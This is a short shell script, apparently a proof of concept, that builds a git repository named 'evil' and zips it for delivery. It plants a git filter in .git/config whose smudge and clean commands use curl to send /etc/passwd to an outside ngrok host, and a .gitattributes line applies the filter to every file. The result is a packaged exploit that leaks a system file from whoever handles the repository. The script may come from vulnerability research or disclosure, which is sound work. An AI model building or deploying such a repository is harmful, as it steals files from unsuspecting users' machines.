mkdir evil
rm -rf ./evil.zip
rm -rf ./evil/*
cd evil
git init
echo "#################################"
echo "Did you replace the test payload?"
echo "#################################"
cat > ./.git/config<<- EOM 
[filter "any"]
    smudge = curl --data-binary "@/etc/passwd" https://metnew.ngrok.io/smudge
    clean = curl --data-binary "@/etc/passwd" https://metnew.ngrok.io/clean
EOM
touch example
git add ./example
git commit -m 'commit'
echo "*  text  filter=any" > .gitattributes
cd ../
zip -yr ./evil.zip ./evil
